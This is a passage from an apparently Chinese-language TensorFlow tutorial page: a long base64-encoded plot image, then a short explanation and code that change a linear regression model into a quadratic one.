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" alt=""></p>
<p>100次迭代之后，平均方差还是挺大的，拟合的不够好，所以考虑二次函数 Y = wXX + uX + b。</p>
<p>所以修改第3步和第4步。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Step 3: create weight and bias, initialized to 0</span>
w <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'weights_1'</span><span class="token punctuation">)</span>
u <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"weights_2"</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> tf<span class="token punctuation">.</span>Variable<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'bias'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># Step 4: build model to predict Y</span>
Y_predicted <span class="token operator">=</span> X <span class="token operator">*</span> X <span class="token operator">*</span> w <span class="token operator">+</span> X <span class="token operator">*</span> u <span class="token operator">+</span> b
</code></pre>
<p><img src="1.png" alt=""></p>
<blockquote>
<blockquote>
